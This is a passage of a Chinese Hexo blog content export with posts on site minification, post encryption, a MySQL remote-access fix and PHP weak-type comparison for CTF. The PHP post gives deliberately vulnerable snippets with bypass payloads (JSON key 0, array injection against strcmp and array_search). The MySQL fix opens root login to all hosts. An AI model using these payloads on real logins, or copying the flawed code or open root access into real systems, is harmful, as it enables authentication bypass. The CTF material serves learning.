class="keyword">return</span> gulp.src(<span class="string">&#x27;./public/**/*.css&#x27;</span>)</span><br><span class="line">    .pipe(minifycss())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">&#x27;./public&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 压缩 public 目录 html</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> gulp.src(<span class="string">&#x27;./public/**/*.html&#x27;</span>)</span><br><span class="line">    .pipe(htmlclean())</span><br><span class="line">    .pipe(htmlmin(&#123;</span><br><span class="line">        <span class="attr">removeComments</span>: <span class="literal">true</span>,  <span class="comment">//清除HTML注释</span></span><br><span class="line">        <span class="attr">collapseWhitespace</span>: <span class="literal">true</span>,  <span class="comment">//压缩HTML</span></span><br><span class="line">        <span class="attr">collapseBooleanAttributes</span>: <span class="literal">true</span>,  <span class="comment">//省略布尔属性的值 &lt;input checked=&quot;true&quot;/&gt; ==&gt; &lt;input checked /&gt;</span></span><br><span class="line">        <span class="attr">removeEmptyAttributes</span>: <span class="literal">true</span>,  <span class="comment">//删除所有空格作属性值 &lt;input id=&quot;&quot; /&gt; ==&gt; &lt;input /&gt;</span></span><br><span class="line">        <span class="attr">removeScriptTypeAttributes</span>: <span class="literal">true</span>,  <span class="comment">//删除&lt;script&gt;的type=&quot;text/javascript&quot;</span></span><br><span class="line">        <span class="attr">removeStyleLinkTypeAttributes</span>: <span class="literal">true</span>,  <span class="comment">//删除&lt;style&gt;和&lt;link&gt;的type=&quot;text/css&quot;</span></span><br><span class="line">        <span class="attr">minifyJS</span>: <span class="literal">true</span>,  <span class="comment">//压缩页面JS</span></span><br><span class="line">        <span class="attr">minifyCSS</span>: <span class="literal">true</span>  <span class="comment">//压缩页面CSS</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;html Error!&#x27;</span>, err.message);</span><br><span class="line">        <span class="built_in">this</span>.end();</span><br><span class="line">    &#125;)</span><br><span class="line">    .pipe(gulp.dest(<span class="string">&#x27;./public&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 压缩 public/js 目录 js</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-js&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> gulp.src(<span class="string">&#x27;./public/**/*.js&#x27;</span>)</span><br><span class="line">    .pipe(uglify())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">&#x27;./public&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩图片任务</span></span><br><span class="line"><span class="comment">// 在命令行输入 gulp minify-images 启动此任务</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-images&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> gulp.src(<span class="string">&#x27;./public/images/**/*.*&#x27;</span>)</span><br><span class="line">    .pipe(imagemin(</span><br><span class="line">    [imagemin.gifsicle(&#123;<span class="string">&#x27;optimizationLevel&#x27;</span>: <span class="number">3</span>&#125;), </span><br><span class="line">    imagemin.jpegtran(&#123;<span class="string">&#x27;progressive&#x27;</span>: <span class="literal">true</span>&#125;), </span><br><span class="line">    imagemin.optipng(&#123;<span class="string">&#x27;optimizationLevel&#x27;</span>: <span class="number">7</span>&#125;), </span><br><span class="line">    imagemin.svgo()],</span><br><span class="line">    &#123;<span class="string">&#x27;verbose&#x27;</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">&#x27;./public/images&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// gulp 4.0 适用的方式</span></span><br><span class="line">gulp.task(<span class="string">&#x27;build&#x27;</span>, gulp.parallel(<span class="string">&#x27;minify-html&#x27;</span>, <span class="string">&#x27;minify-css&#x27;</span>, <span class="string">&#x27;minify-js&#x27;</span></span><br><span class="line"><span class="comment">//build the website</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
<p>遇到的坑！！！！<br>安装gulp -v 显示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash: gulp: command not found</span><br></pre></td></tr></table></figure>
<p>找了一堆博客没有解决，最后用</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">./node_modules/gulp/bin/gulp.js build</span><br></pre></td></tr></table></figure>
<p>代替</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gulp build</span><br></pre></td></tr></table></figure>
<p>效果是一样的。</p>
<p>采坑二！！！：</p>
<p>运行./node_modules/gulp/bin/gulp.js build时报错：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">assert.js:<span class="number">350</span></span><br><span class="line"><span class="keyword">throw</span> err;</span><br><span class="line">^    </span><br><span class="line">AssertionError [<span class="type">ERR_ASSERTION</span>]: Task <span class="function"><span class="keyword">function</span> <span class="title">must</span> <span class="title">be</span> <span class="title">specified</span></span></span><br><span class="line">    at Gulp.set [<span class="type">as</span> <span class="type">_setTask</span>] (D:\boke\node_modules\undertaker\lib\<span class="built_in">set-task</span>.js:<span class="number">10</span>:<span class="number">3</span>)</span><br><span class="line">    at Gulp.task (D:\boke\node_modules\undertaker\lib\task.js:<span class="number">13</span>:<span class="number">8</span>)</span><br><span class="line">    at Object.&lt;anonymous&gt; (D:\boke\gulpfile.js:<span class="number">59</span>:<span class="number">6</span>)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:<span class="number">689</span>:<span class="number">30</span>)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:<span class="number">700</span>:<span class="number">10</span>)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:<span class="number">599</span>:<span class="number">32</span>)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:<span class="number">538</span>:<span class="number">12</span>)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:<span class="number">530</span>:<span class="number">3</span>)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:<span class="number">637</span>:<span class="number">17</span>)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:<span class="number">22</span>:<span class="number">18</span>)</span><br></pre></td></tr></table></figure>

<p>原因是gup3跟gulp4有区别（具体啥区别不解释了）</p>
<p>因为我是gulp4，而gulpfile.js文件的代码是gulp3的，所以报错，将文末的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认任务</span></span><br><span class="line">gulp.task(<span class="string">&#x27;default&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;minify-html&#x27;</span>,<span class="string">&#x27;minify-css&#x27;</span>,<span class="string">&#x27;minify-js&#x27;</span>, <span class="string">&#x27;minify-images&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>修改为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gulp 4.0 适用的方式</span></span><br><span class="line">gulp.task(<span class="string">&#x27;build&#x27;</span>, gulp.parallel(<span class="string">&#x27;minify-html&#x27;</span>, <span class="string">&#x27;minify-css&#x27;</span>, <span class="string">&#x27;minify-js&#x27;</span></span><br><span class="line"><span class="comment">//build the website</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
<p>即可，我前文给的gulpfile.js已修改。</p>
<p>正常运行后的代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ./node_modules/gulp/bin/gulp.js build</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] <span class="keyword">Using</span> gulpfile D:\boke\gulpfile.js</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] Starting <span class="string">&#x27;build&#x27;</span>...</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] Starting <span class="string">&#x27;minify-html&#x27;</span>...</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] Starting <span class="string">&#x27;minify-css&#x27;</span>...</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] Starting <span class="string">&#x27;minify-js&#x27;</span>...</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] <span class="string">&#x27;minify-js&#x27;</span> errored after <span class="number">54</span> ms</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] GulpUglifyError: unable to minify JavaScript</span><br><span class="line">Caused by: SyntaxError: Unexpected token: operator «&lt;»</span><br><span class="line">File: D:\boke\public\js\bai.js</span><br><span class="line">Line: <span class="number">1</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] <span class="string">&#x27;build&#x27;</span> errored after <span class="number">56</span> ms</span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] The following tasks did not complete: minify<span class="literal">-html</span>, minify<span class="literal">-css</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">00</span>:<span class="number">44</span>] Did you forget to signal async completion?</span><br></pre></td></tr></table></figure>
<h3 id="添加快捷命令"><a href="#添加快捷命令" class="headerlink" title="添加快捷命令"></a>添加快捷命令</h3><p>这也是新发现的hexo的小技巧。</p>
<p>在博客根目录下的package.json文件中生成写入scripts即可，本来想写入./node_modules/gulp/bin/gulp.js build这个命令的，耐不住老报错未解决，只能在git bash运行。</p>
<h3 id="hexo-neat插件实现代码压缩"><a href="#hexo-neat插件实现代码压缩" class="headerlink" title="hexo-neat插件实现代码压缩"></a>hexo-neat插件实现代码压缩</h3><p>这个代码压缩的方法简单，gulp老是失败。</p>
<p>但是这个插件也有bug！</p>
<p>压缩后的md文件会使markdown语法的代码失效；会删除全角空格。</p>
<p>在博客根目录安装插件：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install hexo<span class="literal">-neat</span> -<span class="literal">-save</span></span><br></pre></td></tr></table></figure>

<p>博客根目录下的博客根配置文件添加代码：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># hexo-neat 优化提速插件（去掉HTML、css、js的blank字符）</span></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.md&#x27;</span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/index.css&#x27;</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/main.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/bai.js&#x27;</span></span><br></pre></td></tr></table></figure>

<p>需要根据自己的博客情况来设置排除免压缩的文件！</p>
<p>最后执行 hexo cl&amp;&amp;hexo g 就可以实现自动压缩文件。</p>
<h3 id="为文章添加密码"><a href="#为文章添加密码" class="headerlink" title="为文章添加密码"></a>为文章添加密码</h3><p>拒绝白嫖从我做起！</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install -<span class="literal">-save</span> hexo<span class="literal">-blog</span><span class="literal">-encrypt</span></span><br></pre></td></tr></table></figure>

<p>然后文件头添加password和message即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password: test123 </span><br><span class="line">message: 试试加密，这篇的密码是test123 </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>seo优化</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql远程连接失败(10060)</title>
    <url>/2020/04/04/mysql%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5-10060/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>Navicat远程连接数据库老是报错，这里简单总结一下原因。</p>
<h3 id="报错10061"><a href="#报错10061" class="headerlink" title="报错10061"></a>报错10061</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -ntlp | grep -v tcp6 #查看端口状态</span><br><span class="line"></span><br><span class="line">find / -name mysqld.cnf #查找mysqld.cnf位置</span><br><span class="line"></span><br><span class="line">如果端口为127.0.0.1:3306</span><br><span class="line"></span><br><span class="line">vi /etc/mysql/mysql.conf.d/mysqld.cnf </span><br><span class="line"><span class="meta">#</span><span class="bash">将bind-address = 127.0.0.1 修改成 bind-address = 0.0.0.0</span></span><br><span class="line"></span><br><span class="line">service mysql restart #重启mysql</span><br><span class="line">netstat -ntlp | grep -v tcp6 #查看端口状态为0.0.0.0:3306即可</span><br><span class="line"></span><br><span class="line">mysql -u root -p </span><br><span class="line"><span class="meta">#</span><span class="bash">登陆MySQL</span></span><br><span class="line"></span><br><span class="line">use mysql; </span><br><span class="line"><span class="meta">#</span><span class="bash">进入mysql数据库</span></span><br><span class="line"></span><br><span class="line">select Host,User from user; </span><br><span class="line"><span class="meta">#</span><span class="bash">查看user表中root是否支持外部访问</span></span><br><span class="line"></span><br><span class="line">update user set Host = &#x27;%&#x27; where Host = &#x27;localhost&#x27; and User=&#x27;root&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash">修改root数据</span></span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta">#</span><span class="bash">刷新</span></span><br></pre></td></tr></table></figure>

<h3 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h3><p>注意阿里云安全组别忘记放行3306端口</p>
]]></content>
      <categories>
        <category>MySql</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>php弱类型比较</title>
    <url>/2020/01/19/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>在php中 === 和 == 不同<br>用===进行比较，会先判断两个字符串类型是否相同，再进行比较。<br>用==进行比较时，会将字符串类型转化成相同的，然后再进行比较。</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure>

<p>“admin” == 0 进行比较时，字符串admin没有数值，所以为0<br>“0e123456” == “0e4456789”进行比较时，0e这类字符串被识别为科学计数法的数字，0的多少次方都是0</p>
<p>当字符串被当作一个数值来取值，该字符串的开始部分决定了他的值，如果该字符串以合法的数值开始，则使用该数值，否则值为0<br>这就很好的解释了为啥“1admin”==1为ture，“admin1”==1为false。</p>
<h3 id="引申"><a href="#引申" class="headerlink" title="引申"></a>引申</h3><h4 id="md5绕过（hash比较缺陷）"><a href="#md5绕过（hash比较缺陷）" class="headerlink" title="md5绕过（hash比较缺陷）"></a>md5绕过（hash比较缺陷）</h4><p>md5加密后的字符串为0e开头</p>
<h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:  message={“key”:0}</p>
<h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span>[<span class="variable">$i</span>]=intval(<span class="variable">$test</span>[<span class="variable">$i</span>]);  <span class="comment">//intval()用于获取变量的整数值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">&quot;admin&quot;</span>,<span class="variable">$test</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//is_array用于检测变量是否为一个数组</span></span><br><span class="line"><span class="comment">//array_search 在数组中搜索健值，并返回键名</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码首先判断传入的是不是数组，再循环遍历查看每个值，有没有admin，如果有amdin就exit，并且将每个值int化，再想要进行判断数组是否有amidn，有则echo flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">var_dump(array_search(<span class="string">&quot;admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(0) =&gt; 返回键值0</span></span><br><span class="line">var_dump(array_seach(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt;返回键值1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>array_search 第三个参数为true则进行严格的过滤，不能绕过（默认为false），array_search函数类似于==，也就是相当于$a==“admin”,当然是$a=0<br>payload test[]=0</p>
<h4 id="Strcmp漏洞绕过-（php版本低于5-3）"><a href="#Strcmp漏洞绕过-（php版本低于5-3）" class="headerlink" title="Strcmp漏洞绕过 （php版本低于5.3）"></a>Strcmp漏洞绕过 （php版本低于5.3）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>strcmp是比较两个字符串，如果str1&lt;str2则返回&lt;0，如果str1&gt;str2，则返回&gt;0，如果两者相等则返回0</p>
<p>strcmp期望类型是字符串，传入数组发生错误，但是判断还是相等</p>
<p>payload：password[]=xxx</p>
<h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;4admin&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail1&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail2&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail3&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;sucess&quot;</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;failall&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>php</tag>
        <tag>php弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>python一键更新博客</title>
    <url>/2020/02/28/python%E4%B8%80%E9%94%AE%E6%9B%B4%E6%96%B0%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>hexo更新一篇博客通常需要：</p>
<p>hexo clean（清理缓存）</p>
<p>hexo g（hexo部署）</p>
<p>hexo d（将代码上传到托管平台）</p>
<p>因为我用的码云，部署更新是付费的，所有还需要去pages点一下更新。（就这一步麻烦一点点，需要用selenium模拟浏览器行为。）</p>
<p>因为很简单，直接上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">自动执行hexo命令</span></span><br><span class="line"><span class="string">python利用imagemagick压缩图片</span></span><br><span class="line"><span class="string">利用selenium自动部署博客</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minify_images</span>(<span class="params">rootDir</span>):</span>    </span><br><span class="line">    <span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(rootDir):        </span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:            </span><br><span class="line">            p = os.path.join(root,file)</span><br><span class="line">            <span class="keyword">if</span> p[-<span class="number">3</span>:] == <span class="string">&#x27;jpg&#x27;</span> <span class="keyword">and</span> os.path.getsize(p) &gt; <span class="number">50000</span>:</span><br><span class="line">                c = <span class="string">&quot;magick -quality 50 &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p,p)</span><br><span class="line">                os.system(c)</span><br><span class="line">            <span class="keyword">elif</span> p[-<span class="number">3</span>:] == <span class="string">&#x27;png&#x27;</span><span class="keyword">and</span> os.path.getsize(p) &gt; <span class="number">50000</span>:</span><br><span class="line">                c = <span class="string">&quot;magick -quality 50 &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p,p)</span><br><span class="line">                os.system(c)  </span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> dirs:            </span><br><span class="line">            minify_images(<span class="built_in">dir</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexo</span>():</span></span><br><span class="line">    os.system(<span class="string">&#x27;hexo cl&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;缓存清理完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&#x27;hexo g&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hexo部署完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&#x27;gulp&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gulp压缩完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    minify_images(<span class="string">&#x27;public/img&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;python压缩图片完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&#x27;hexo d&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;博客上传完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gitee</span>():</span></span><br><span class="line">    chrome_options = webdriver.ChromeOptions()</span><br><span class="line">    <span class="comment"># 使用headless无界面浏览器模式</span></span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>) </span><br><span class="line">    <span class="comment">#增加无界面选项</span></span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>) </span><br><span class="line">    <span class="comment">#如果不加这个选项，有时定位会出现问题</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动浏览器，获取网页源代码</span></span><br><span class="line">    browser = webdriver.Chrome(chrome_options=chrome_options)<span class="comment">#chrome_options=chrome_options)</span></span><br><span class="line">    browser.implicitly_wait(<span class="number">6</span>) </span><br><span class="line">    mainUrl = <span class="string">&quot;https://gitee.com/login&quot;</span></span><br><span class="line">    browser.get(mainUrl)</span><br><span class="line"></span><br><span class="line">    user = browser.find_element_by_id(<span class="string">&quot;user_login&quot;</span>)</span><br><span class="line">    password = browser.find_element_by_id(<span class="string">&quot;user_password&quot;</span>)</span><br><span class="line">    <span class="comment"># 定位</span></span><br><span class="line"></span><br><span class="line">    user_ = <span class="string">&quot;****************@163.com&quot;</span></span><br><span class="line">    password_ = <span class="string">&quot;******************&quot;</span></span><br><span class="line">    user.send_keys(user_)</span><br><span class="line">    password.send_keys(password_)</span><br><span class="line">    sbm = browser.find_element_by_css_selector(<span class="string">&quot;.ui.fluid.orange.submit.button.large&quot;</span>) <span class="comment">#class含空格要注意</span></span><br><span class="line">    sbm.click()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span 